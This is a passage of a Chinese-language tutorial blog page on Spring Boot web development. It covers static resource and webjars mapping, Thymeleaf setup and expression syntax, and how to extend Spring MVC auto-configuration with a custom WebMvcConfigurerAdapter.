class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">WebMvcAuotConfiguration：</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addResourceHandlers</span><span class="params">(ResourceHandlerRegistry registry)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>.resourceProperties.isAddMappings()) &#123;</span><br><span class="line">logger.debug(<span class="string">"Default resource handling disabled"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">Integer cachePeriod = <span class="keyword">this</span>.resourceProperties.getCachePeriod();</span><br><span class="line"><span class="keyword">if</span> (!registry.hasMappingForPattern(<span class="string">"/webjars/**"</span>)) &#123;</span><br><span class="line">customizeResourceHandlerRegistration(</span><br><span class="line">registry.addResourceHandler(<span class="string">"/webjars/**"</span>)</span><br><span class="line">.addResourceLocations(</span><br><span class="line"><span class="string">"classpath:/META-INF/resources/webjars/"</span>)</span><br><span class="line">.setCachePeriod(cachePeriod));</span><br><span class="line">&#125;</span><br><span class="line">String staticPathPattern = <span class="keyword">this</span>.mvcProperties.getStaticPathPattern();</span><br><span class="line">         <span class="comment">//静态资源文件夹映射</span></span><br><span class="line"><span class="keyword">if</span> (!registry.hasMappingForPattern(staticPathPattern)) &#123;</span><br><span class="line">customizeResourceHandlerRegistration(</span><br><span class="line">registry.addResourceHandler(staticPathPattern)</span><br><span class="line">.addResourceLocations(</span><br><span class="line"><span class="keyword">this</span>.resourceProperties.getStaticLocations())</span><br><span class="line">.setCachePeriod(cachePeriod));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//配置欢迎页映射</span></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> WelcomePageHandlerMapping <span class="title">welcomePageHandlerMapping</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">ResourceProperties resourceProperties)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> WelcomePageHandlerMapping(resourceProperties.getWelcomePage(),</span><br><span class="line"><span class="keyword">this</span>.mvcProperties.getStaticPathPattern());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//配置喜欢的图标</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty</span>(value = <span class="string">"spring.mvc.favicon.enabled"</span>, matchIfMissing = <span class="keyword">true</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">FaviconConfiguration</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ResourceProperties resourceProperties;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FaviconConfiguration</span><span class="params">(ResourceProperties resourceProperties)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.resourceProperties = resourceProperties;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> SimpleUrlHandlerMapping <span class="title">faviconHandlerMapping</span><span class="params">()</span> </span>&#123;</span><br><span class="line">SimpleUrlHandlerMapping mapping = <span class="keyword">new</span> SimpleUrlHandlerMapping();</span><br><span class="line">mapping.setOrder(Ordered.HIGHEST_PRECEDENCE + <span class="number">1</span>);</span><br><span class="line">             <span class="comment">//所有  **/favicon.ico </span></span><br><span class="line">mapping.setUrlMap(Collections.singletonMap(<span class="string">"**/favicon.ico"</span>,</span><br><span class="line">faviconRequestHandler()));</span><br><span class="line"><span class="keyword">return</span> mapping;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ResourceHttpRequestHandler <span class="title">faviconRequestHandler</span><span class="params">()</span> </span>&#123;</span><br><span class="line">ResourceHttpRequestHandler requestHandler = <span class="keyword">new</span> ResourceHttpRequestHandler();</span><br><span class="line">requestHandler</span><br><span class="line">.setLocations(<span class="keyword">this</span>.resourceProperties.getFaviconLocations());</span><br><span class="line"><span class="keyword">return</span> requestHandler;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>==1）、所有 /webjars/** ，都去 classpath:/META-INF/resources/webjars/ 找资源；==</p><p>​    webjars：以jar包的方式引入静态资源；</p><p><a href="http://www.webjars.org/" target="_blank" rel="noopener">http://www.webjars.org/</a></p><p><img src="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180203181751.png" alt></p><p>localhost:8080/webjars/jquery/3.3.1/jquery.js</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--引入jquery-webjar--&gt;</span>在访问的时候只需要写webjars下面资源的名称即可</span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.webjars<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jquery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>==2）、”/**” 访问当前项目的任何资源，都去（静态资源的文件夹）找映射==</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;classpath:&#x2F;META-INF&#x2F;resources&#x2F;&quot;, </span><br><span class="line">&quot;classpath:&#x2F;resources&#x2F;&quot;,</span><br><span class="line">&quot;classpath:&#x2F;static&#x2F;&quot;, </span><br><span class="line">&quot;classpath:&#x2F;public&#x2F;&quot; </span><br><span class="line">&quot;&#x2F;&quot;：当前项目的根路径</span><br></pre></td></tr></table></figure><p>localhost:8080/abc ===  去静态资源文件夹里面找abc</p><p>==3）、欢迎页； 静态资源文件夹下的所有index.html页面；被”/**”映射；==</p><p>​    localhost:8080/   找index页面</p><p>==4）、所有的 **/favicon.ico  都是在静态资源文件下找；==</p><h2><span id="3-模板引擎">3、模板引擎</span></h2><p>JSP、Velocity、Freemarker、Thymeleaf</p><p><img src="template-engine.png" alt></p><p>SpringBoot推荐的Thymeleaf；</p><p>语法更简单，功能更强大；</p><h3><span id="1-引入thymeleaf">1、引入thymeleaf；</span></h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          2.1.6</span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">切换thymeleaf版本</span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">thymeleaf.version</span>&gt;</span>3.0.9.RELEASE<span class="tag">&lt;/<span class="name">thymeleaf.version</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 布局功能的支持程序  thymeleaf3主程序  layout2以上版本 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- thymeleaf2   layout1--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">thymeleaf-layout-dialect.version</span>&gt;</span>2.2.2<span class="tag">&lt;/<span class="name">thymeleaf-layout-dialect.version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure><h3><span id="2-thymeleaf使用">2、Thymeleaf使用</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"spring.thymeleaf"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThymeleafProperties</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Charset DEFAULT_ENCODING = Charset.forName(<span class="string">"UTF-8"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> MimeType DEFAULT_CONTENT_TYPE = MimeType.valueOf(<span class="string">"text/html"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEFAULT_PREFIX = <span class="string">"classpath:/templates/"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEFAULT_SUFFIX = <span class="string">".html"</span>;</span><br><span class="line">  <span class="comment">//</span></span><br></pre></td></tr></table></figure><p>只要我们把HTML页面放在classpath:/templates/，thymeleaf就能自动渲染；</p><p>使用：</p><p>1、导入thymeleaf的名称空间</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">xmlns:th</span>=<span class="string">"http://www.thymeleaf.org"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2、使用thymeleaf语法；</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">xmlns:th</span>=<span class="string">"http://www.thymeleaf.org"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>成功！<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--th:text 将div里面的文本内容设置为 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">th:text</span>=<span class="string">"$&#123;hello&#125;"</span>&gt;</span>这是显示欢迎信息<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3><span id="3-语法规则">3、语法规则</span></h3><p>1）、th:text；改变当前元素里面的文本内容；</p><p>​    th：任意html属性；来替换原生属性的值</p><p><img src="2018-02-04_123955.png" alt></p><p>2）、表达式？</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Simple</span> <span class="string">expressions:（表达式语法）</span></span><br><span class="line">    <span class="attr">Variable</span> <span class="string">Expressions: $&#123;...&#125;：获取变量值；OGNL；</span></span><br><span class="line">    <span class="attr">1）、获取对象的属性、调用方法</span></span><br><span class="line">    <span class="attr">2）、使用内置的基本对象：</span></span><br><span class="line"><span class="comment">    #ctx : the context object.</span></span><br><span class="line"><span class="comment">    #vars: the context variables.</span></span><br><span class="line"><span class="comment">                #locale : the context locale.</span></span><br><span class="line"><span class="comment">                #request : (only in Web Contexts) the HttpServletRequest object.</span></span><br><span class="line"><span class="comment">                #response : (only in Web Contexts) the HttpServletResponse object.</span></span><br><span class="line"><span class="comment">                #session : (only in Web Contexts) the HttpSession object.</span></span><br><span class="line"><span class="comment">                #servletContext : (only in Web Contexts) the ServletContext object.</span></span><br><span class="line">                </span><br><span class="line">                <span class="attr">$&#123;session.foo&#125;</span></span><br><span class="line">            <span class="attr">3）、内置的一些工具对象：</span></span><br><span class="line"><span class="comment">#execInfo : information about the template being processed.</span></span><br><span class="line"><span class="comment">#messages : methods for obtaining externalized messages inside variables expressions, in the same way as they would be obtained using #&#123;…&#125; syntax.</span></span><br><span class="line"><span class="comment">#uris : methods for escaping parts of URLs/URIs</span></span><br><span class="line"><span class="comment">#conversions : methods for executing the configured conversion service (if any).</span></span><br><span class="line"><span class="comment">#dates : methods for java.util.Date objects: formatting, component extraction, etc.</span></span><br><span class="line"><span class="comment">#calendars : analogous to #dates , but for java.util.Calendar objects.</span></span><br><span class="line"><span class="comment">#numbers : methods for formatting numeric objects.</span></span><br><span class="line"><span class="comment">#strings : methods for String objects: contains, startsWith, prepending/appending, etc.</span></span><br><span class="line"><span class="comment">#objects : methods for objects in general.</span></span><br><span class="line"><span class="comment">#bools : methods for boolean evaluation.</span></span><br><span class="line"><span class="comment">#arrays : methods for arrays.</span></span><br><span class="line"><span class="comment">#lists : methods for lists.</span></span><br><span class="line"><span class="comment">#sets : methods for sets.</span></span><br><span class="line"><span class="comment">#maps : methods for maps.</span></span><br><span class="line"><span class="comment">#aggregates : methods for creating aggregates on arrays or collections.</span></span><br><span class="line"><span class="comment">#ids : methods for dealing with id attributes that might be repeated (for example, as a result of an iteration).</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">Selection</span> <span class="string">Variable Expressions: *&#123;...&#125;：选择表达式：和$&#123;&#125;在功能上是一样；</span></span><br><span class="line">    <span class="meta">补充：配合</span> <span class="string">th:object="$&#123;session.user&#125;：</span></span><br><span class="line">   <span class="meta">&lt;div</span> <span class="string">th:object="$&#123;session.user&#125;"&gt;</span></span><br><span class="line">    <span class="meta">&lt;p&gt;Name</span>: <span class="string">&lt;span th:text="*&#123;firstName&#125;"&gt;Sebastian&lt;/span&gt;.&lt;/p&gt;</span></span><br><span class="line">    <span class="meta">&lt;p&gt;Surname</span>: <span class="string">&lt;span th:text="*&#123;lastName&#125;"&gt;Pepper&lt;/span&gt;.&lt;/p&gt;</span></span><br><span class="line">    <span class="meta">&lt;p&gt;Nationality</span>: <span class="string">&lt;span th:text="*&#123;nationality&#125;"&gt;Saturn&lt;/span&gt;.&lt;/p&gt;</span></span><br><span class="line">    <span class="attr">&lt;/div&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="attr">Message</span> <span class="string">Expressions: #&#123;...&#125;：获取国际化内容</span></span><br><span class="line">    <span class="attr">Link</span> <span class="string">URL Expressions: @&#123;...&#125;：定义URL；</span></span><br><span class="line">    <span class="meta">@&#123;/order/process(execId</span>=<span class="string">$&#123;execId&#125;,execType='FAST')&#125;</span></span><br><span class="line">    <span class="attr">Fragment</span> <span class="string">Expressions: ~&#123;...&#125;：片段引用表达式</span></span><br><span class="line">    <span class="meta">&lt;div</span> <span class="string">th:insert="~&#123;commons :: main&#125;"&gt;...&lt;/div&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="attr">Literals（字面量）</span></span><br><span class="line">      <span class="attr">Text</span> <span class="string">literals: 'one text' , 'Another one!' ,…</span></span><br><span class="line">      <span class="attr">Number</span> <span class="string">literals: 0 , 34 , 3.0 , 12.3 ,…</span></span><br><span class="line">      <span class="attr">Boolean</span> <span class="string">literals: true , false</span></span><br><span class="line">      <span class="attr">Null</span> <span class="string">literal: null</span></span><br><span class="line">      <span class="attr">Literal</span> <span class="string">tokens: one , sometext , main ,…</span></span><br><span class="line"><span class="attr">Text</span> <span class="string">operations:（文本操作）</span></span><br><span class="line">    <span class="attr">String</span> <span class="string">concatenation: +</span></span><br><span class="line">    <span class="attr">Literal</span> <span class="string">substitutions: |The name is $&#123;name&#125;|</span></span><br><span class="line"><span class="attr">Arithmetic</span> <span class="string">operations:（数学运算）</span></span><br><span class="line">    <span class="attr">Binary</span> <span class="string">operators: + , - , * , / , %</span></span><br><span class="line">    <span class="attr">Minus</span> <span class="string">sign (unary operator): -</span></span><br><span class="line"><span class="attr">Boolean</span> <span class="string">operations:（布尔运算）</span></span><br><span class="line">    <span class="attr">Binary</span> <span class="string">operators: and , or</span></span><br><span class="line">    <span class="attr">Boolean</span> <span class="string">negation (unary operator): ! , not</span></span><br><span class="line"><span class="attr">Comparisons</span> <span class="string">and equality:（比较运算）</span></span><br><span class="line">    <span class="attr">Comparators</span>: <span class="string">&gt; , &lt; , &gt;= , &lt;= ( gt , lt , ge , le )</span></span><br><span class="line">    <span class="attr">Equality</span> <span class="string">operators: == , != ( eq , ne )</span></span><br><span class="line"><span class="attr">Conditional</span> <span class="string">operators:条件运算（三元运算符）</span></span><br><span class="line">    <span class="meta">If-then</span>: <span class="string">(if) ? (then)</span></span><br><span class="line">    <span class="meta">If-then-else</span>: <span class="string">(if) ? (then) : (else)</span></span><br><span class="line">    <span class="attr">Default</span>: <span class="string">(value) ?: (defaultvalue)</span></span><br><span class="line"><span class="attr">Special</span> <span class="string">tokens:</span></span><br><span class="line">    <span class="meta">No-Operation</span>: <span class="string">_</span></span><br></pre></td></tr></table></figure><h2><span id="4-springmvc自动配置">4、SpringMVC自动配置</span></h2><p><a href="https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#boot-features-developing-web-applications" target="_blank" rel="noopener">https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#boot-features-developing-web-applications</a></p><h3><span id="1-spring-mvc-auto-configuration">1. Spring MVC auto-configuration</span></h3><p>Spring Boot 自动配置好了SpringMVC</p><p>以下是SpringBoot对SpringMVC的默认配置:<strong>==（WebMvcAutoConfiguration）==</strong></p><ul><li><p>Inclusion of <code>ContentNegotiatingViewResolver</code> and <code>BeanNameViewResolver</code> beans.</p><ul><li>自动配置了ViewResolver（视图解析器：根据方法的返回值得到视图对象（View），视图对象决定如何渲染（转发？重定向？））</li><li>ContentNegotiatingViewResolver：组合所有的视图解析器的；</li><li>==如何定制：我们可以自己给容器中添加一个视图解析器；自动的将其组合进来；==</li></ul></li><li><p>Support for serving static resources, including support for WebJars (see below).静态资源文件夹路径,webjars</p></li><li><p>Static <code>index.html</code> support. 静态首页访问</p></li><li><p>Custom <code>Favicon</code> support (see below).  favicon.ico</p></li></ul><ul><li><p>自动注册了 of <code>Converter</code>, <code>GenericConverter</code>, <code>Formatter</code> beans.</p><ul><li>Converter：转换器；  public String hello(User user)：类型转换使用Converter</li><li><code>Formatter</code>  格式化器；  2017.12.17===Date；</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty</span>(prefix = <span class="string">"spring.mvc"</span>, name = <span class="string">"date-format"</span>)<span class="comment">//在文件中配置日期格式化的规则</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Formatter&lt;Date&gt; <span class="title">dateFormatter</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> DateFormatter(<span class="keyword">this</span>.mvcProperties.getDateFormat());<span class="comment">//日期格式化组件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    ==自己添加的格式化器转换器，我们只需要放在容器中即可==</p><ul><li><p>Support for <code>HttpMessageConverters</code> (see below).</p><ul><li><p>HttpMessageConverter：SpringMVC用来转换Http请求和响应的；User—Json；</p></li><li><p><code>HttpMessageConverters</code> 是从容器中确定；获取所有的HttpMessageConverter；</p><p>==自己给容器中添加HttpMessageConverter，只需要将自己的组件注册容器中（@Bean,@Component）==</p></li></ul></li></ul><ul><li><p>Automatic registration of <code>MessageCodesResolver</code> (see below).定义错误代码生成规则</p></li><li><p>Automatic use of a <code>ConfigurableWebBindingInitializer</code> bean (see below).</p><p>==我们可以配置一个ConfigurableWebBindingInitializer来替换默认的；（添加到容器）==</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">初始化WebDataBinder；</span><br><span class="line">请求数据&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;JavaBean；</span><br></pre></td></tr></table></figure></li></ul><p><strong>org.springframework.boot.autoconfigure.web：web的所有自动场景；</strong></p><p>If you want to keep Spring Boot MVC features, and you just want to add additional <a href="https://docs.spring.io/spring/docs/4.3.14.RELEASE/spring-framework-reference/htmlsingle#mvc" target="_blank" rel="noopener">MVC configuration</a> (interceptors, formatters, view controllers etc.) you can add your own <code>@Configuration</code> class of type <code>WebMvcConfigurerAdapter</code>, but <strong>without</strong> <code>@EnableWebMvc</code>. If you wish to provide custom instances of <code>RequestMappingHandlerMapping</code>, <code>RequestMappingHandlerAdapter</code> or <code>ExceptionHandlerExceptionResolver</code> you can declare a <code>WebMvcRegistrationsAdapter</code> instance providing such components.</p><p>If you want to take complete control of Spring MVC, you can add your own <code>@Configuration</code> annotated with <code>@EnableWebMvc</code>.</p><h3><span id="2-扩展springmvc">2、扩展SpringMVC</span></h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:view-controller</span> <span class="attr">path</span>=<span class="string">"/hello"</span> <span class="attr">view-name</span>=<span class="string">"success"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:mapping</span> <span class="attr">path</span>=<span class="string">"/hello"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:interceptors</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>==编写一个配置类（@Configuration），是WebMvcConfigurerAdapter类型；不能标注@EnableWebMvc==</strong>;</p><p>既保留了所有的自动配置，也能用我们扩展的配置；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用WebMvcConfigurerAdapter可以来扩展SpringMVC的功能</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMvcConfig</span> <span class="keyword">extends</span> <span class="title">WebMvcConfigurerAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> </span>&#123;</span><br><span class="line">       <span class="comment">// super.addViewControllers(registry);</span></span><br><span class="line">        <span class="comment">//浏览器发送 /atguigu 请求来到 success</span></span><br><span class="line">        registry.addViewController(<span class="string">"/atguigu"</span>).setViewName(<span class="string">"success"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理：</p><p>​    1）、WebMvcAutoConfiguration是SpringMVC的自动配置类</p><p>​    2）、在做其他自动配置时会导入；@Import(<strong>EnableWebMvcConfiguration</strong>.class)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">   <span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">EnableWebMvcConfiguration</span> <span class="keyword">extends</span> <span class="title">DelegatingWebMvcConfiguration</span> </span>&#123;</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">final</span> WebMvcConfigurerComposite configurers = <span class="keyword">new</span> WebMvcConfigurerComposite();</span><br><span class="line"></span><br><span class="line"> <span class="comment">//从容器中获取所有的WebMvcConfigurer</span></span><br><span class="line">     <span class="meta">@Autowired</span>(required = <span class="keyword">false</span>)</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setConfigurers</span><span class="params">(List&lt;WebMvcConfigurer&gt; configurers)</span> </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (!CollectionUtils.isEmpty(configurers)) &#123;</span><br><span class="line">             <span class="keyword">this</span>.configurers.addWebMvcConfigurers(configurers);</span><br><span class="line">           <span class="comment">//一个参考实现；将所有的WebMvcConfigurer相关配置都来一起调用；  </span></span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">            <span class="comment">// public void addViewControllers(ViewControllerRegistry registry) &#123;</span></span><br><span class="line">             <span class="comment">//    for (WebMvcConfigurer delegate : this.delegates) &#123;</span></span><br><span class="line">              <span class="comment">//       delegate.addViewControllers(registry);</span></span><br><span class="line">              <span class="comment">//   &#125;</span></span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    3）、容器中所有的WebMvcConfigurer都会一起起作用；</p><p>​    4）、我们的配置类也会被调用；</p><p>​    效果：SpringMVC的自动配置和我们的扩展配置都会起作用；</p><h3><span 